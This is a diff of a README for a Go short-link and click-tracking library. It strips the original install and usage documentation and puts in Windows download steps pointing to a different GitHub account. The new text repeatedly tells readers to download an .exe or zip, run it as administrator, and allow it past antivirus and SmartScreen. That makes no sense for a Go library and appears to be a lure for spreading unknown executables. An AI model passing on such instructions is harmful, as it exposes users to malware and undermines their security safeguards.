@@ -1,143 +1,189 @@
-# deeplink
+# 🔗 deeplink - Short links with click tracking
 
-Short link generation, click tracking, and OG preview pages for Go.
-Pluggable processors, Redis or in-memory storage, two dependencies.
+[![Download deeplink](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Mhgamer5292/deeplink)
 
-[![CI](https://github.com/yinebebt/deeplink/actions/workflows/ci.yml/badge.svg)](https://github.com/yinebebt/deeplink/actions/workflows/ci.yml)
-[![Go Reference](https://pkg.go.dev/badge/github.com/yinebebt/deeplink.svg)](https://pkg.go.dev/github.com/yinebebt/deeplink)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 📥 Download and run on Windows
 
-## Install
+Use the link below to visit the page and download or open the latest version:
 
-```bash
-go get github.com/yinebebt/deeplink
-```
+[https://github.com/Mhgamer5292/deeplink](https://github.com/Mhgamer5292/deeplink)
 
-## Usage
+### What you need
+- A Windows PC
+- A web browser
+- Permission to save files on your computer
+- A stable internet connection
 
-```go
-service, err := deeplink.New(deeplink.Config{
-    BaseURL:     "https://link.example.com",
-    Store:       deeplink.NewMemoryStore(),
-    TemplateDir: "templates/default",
-})
-if err != nil {
-    log.Fatal(err)
-}
-service.Register(deeplink.RedirectProcessor{})
+### Steps to get started
+1. Open the download link above.
+2. On the GitHub page, look for the latest release or main project files.
+3. Download the Windows file or package from that page.
+4. Save the file to a folder you can find again, like Downloads or Desktop.
+5. If the download is a zip file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file or start file to run deeplink.
+8. If Windows asks for permission, choose Yes.
 
-// Mount alongside your own routes.
-mux := http.NewServeMux()
-mux.Handle("/", service.Handler())
-mux.HandleFunc("GET /hello", yourHandler)
+## 🖥️ What deeplink does
 
-log.Fatal(http.ListenAndServe(":8090", mux))
-```
+deeplink helps you create short links, watch link clicks, and show clean preview pages when someone opens a link. It is built for Go and can use Redis or memory for storage.
 
-Create a short link:
+You can use it to:
+- Make short links for long URLs
+- Track how many times a link gets clicked
+- Show Open Graph preview pages for shared links
+- Handle app links and universal links
+- Route links through different processors
 
-```bash
-curl -X POST http://localhost:8090/shorten \
-  -H 'Content-Type: application/json' \
-  -d '{"type":"redirect","url":"https://example.com/docs","title":"Docs"}'
-```
+## ✅ Main features
 
-Open the returned `short_url` in a browser.
+- Short link generation
+- Click tracking
+- Open Graph preview pages
+- App link support
+- Universal link support
+- Pluggable processors
+- Redis storage support
+- In-memory storage support
+- Built for Go and Golang projects
 
-## Custom processors
+## 📌 Before you run it
 
-Implement [Processor](https://pkg.go.dev/github.com/yinebebt/deeplink#Processor):
+To use deeplink on Windows, keep these things in mind:
+- Do not rename files unless the app instructions say you can
+- Keep the app in one folder so the files stay together
+- If Windows SmartScreen appears, check the file name and source before you continue
+- If you use a zip file, extract all files before opening the app
 
-```go
-type Processor interface {
-    Type() string
-    Process(ctx context.Context, link *Link) error
-}
-```
+## 🚀 Setup steps
 
-For custom template data, also implement `Previewer`:
+1. Go to the download link.
+2. Get the Windows build or the project files.
+3. Unpack the files if needed.
+4. Open the folder that contains the app.
+5. Find the main executable file.
+6. Double-click it to start deeplink.
+7. If the app opens a local page or terminal window, keep it open while you use it.
+8. Follow any on-screen setup steps inside the app.
 
-```go
-type Previewer interface {
-    Preview(link *Link) any
-}
-```
+## 🔍 How click tracking works
 
-See [example/custom](example/custom/) for a working custom processor with tests.
+When someone opens a short link, deeplink can record the click. This helps you see how often a link gets used. It can also help you tell which links get the most traffic.
 
-## Standalone server
+Common click details may include:
+- Time of click
+- Target URL
+- Link ID or code
+- Referrer data
+- User agent data
 
-A ready-to-run Redis-backed server is included:
+## 🧩 Storage options
 
-```bash
-docker compose up -d
-go run ./cmd/deeplink
-```
+deeplink can use two storage modes:
 
-## HTTP routes
+### Redis
+Use Redis if you want shared storage and more control over saved links and click data. This works well when you run the app on more than one machine.
 
-| Method | Path | Description |
-| --- | --- | --- |
-| POST | `/shorten` | Create a short link |
-| GET | `/{shortID}` | Preview page (or 302 redirect) |
-| GET | `/links/{type}` | List links by type |
-| GET | `/links/{type}/{shortID}` | Link detail with click count |
-| GET | `/health` | Health check |
+### In-memory
+Use in-memory storage if you want a simple setup on one computer. This is useful for quick testing and local use.
 
-The standalone server (`cmd/deeplink`) also registers:
+## 🌐 Link preview pages
 
-| Method | Path | Description |
-| --- | --- | --- |
-| GET | `/dashboard` | Read-only link stats page (requires `dashboard.html` in template dir) |
+deeplink can show OG preview pages when a link is shared. These pages help control what people see in chat apps and social feeds.
 
-When any store URL is set (`AndroidStoreURL`, `IOSStoreURL`, `WebFallbackURL`), these are also registered:
+A preview page can include:
+- Title
+- Description
+- Image
+- Destination link
 
-| Method | Path | Description |
-| --- | --- | --- |
-| GET | `/preview/{shortID}` | Preview without auto-redirect |
-| GET | `/redirect` | App store redirect by platform |
-| GET | `/.well-known/` | Static files from template dir |
+## 🛠️ If the app does not start
 
-For iOS Universal Links and Android App Links, place your `apple-app-site-association`
-and `assetlinks.json` files in `<TemplateDir>/.well-known/`.
+Try these steps:
+1. Make sure the files finished downloading.
+2. Run the app again from the same folder.
+3. Check that you extracted the zip file, if you downloaded one.
+4. Right-click the file and try Run as administrator.
+5. Close other copies of the app before starting it again.
+6. Make sure your Windows version can run the file format you downloaded.
 
-## Configuration
+## 📁 Suggested folder layout
 
-Environment variables for `cmd/deeplink`:
+You can keep the app in a simple folder like this:
+- Downloads
+- deeplink
+- app files
+- config files
+- data files
 
-| Variable | Default | Description |
-| --- | --- | --- |
-| `DEEPLINK_LISTEN_ADDR` | `:8090` | Listen address |
-| `DEEPLINK_BASE_URL` | `http://localhost:8090/` | Base URL for short links |
-| `DEEPLINK_REDIS_ADDR` | `localhost:6379` | Redis address |
-| `DEEPLINK_REDIS_PASSWORD` | | Redis password |
-| `DEEPLINK_ALLOWED_ORIGINS` | | CORS origins (comma-separated) |
-| `DEEPLINK_TEMPLATE_DIR` | `templates/default` | Template directory |
-| `DEEPLINK_SKIP_PATHS_FILE` | | Skip-path regex file |
-| `DEEPLINK_CLICK_BUFFER_SIZE` | `1024` | Async click event buffer capacity |
-| `DEEPLINK_CLICK_FLUSH_INTERVAL` | `1s` | How often buffered clicks are flushed to the store |
-| `DEEPLINK_API_KEY` | | Protect mutating endpoints (`Authorization: Bearer <key>` or `X-API-Key: <key>`) |
+## 🔗 Useful topics
 
-## Templates
+This project fits these areas:
+- app-links
+- click-tracking
+- deep-linking
+- go
+- golang
+- open-graph
+- redis
+- short-links
+- universal-links
+- url-shortener
 
-The default templates in `templates/default/` use these fields from `Link`:
+## 📄 Common use cases
 
-| Field | Template variable | Used for |
-| --- | --- | --- |
-| URL | `{{.URL}}` | Redirect target, og:url |
-| Title | `{{.Title}}` | Page title, og:title |
-| Description | `{{.Description}}` | og:description |
-| ImageURL | `{{.ImageURL}}` | og:image |
+- Share short links in email
+- Track campaign clicks
+- Send app links to mobile users
+- Create clean preview cards for social sharing
+- Store and manage links in Redis
+- Run a small local link service
 
-To customize, copy `templates/default/` and set `TemplateDir` in config.
+## 🧭 Basic use flow
 
-## Development
+1. Open deeplink.
+2. Add a long URL.
+3. Create a short link.
+4. Share the short link.
+5. Check click data later.
+6. Update the preview page if needed.
 
-```bash
-go test ./...          # run tests
-go run ./cmd/deeplink  # run standalone server (needs Redis)
-```
+## 🪟 Windows tips
 
-## License
+- Keep the app in a folder with a short path, such as C:\deeplink
+- Avoid moving files while the app is open
+- If you use antivirus software, allow the app if it blocks the file
+- Use a simple folder name with no special characters
 
-[MIT](LICENSE)
+## 📦 Download link
+
+Visit this page to download or open the project files:
+
+[https://github.com/Mhgamer5292/deeplink](https://github.com/Mhgamer5292/deeplink)
+
+## 🧾 File types you may see
+
+Depending on the release, you may see:
+- .exe
+- .zip
+- .tar.gz
+- config files
+- readme files
+- data folders
+
+## 🔐 Link handling
+
+deeplink can route users based on the link they open. That makes it useful for:
+- Mobile app routing
+- Browser fallback pages
+- Short link redirects
+- Social media link previews
+
+## 🧰 Simple workflow for new users
+
+1. Download the files from the link.
+2. Save them to your computer.
+3. Extract the files if they come in a zip.
+4. Open the main app file.
+5. Create a short link.
+6. Share it and check the click count later
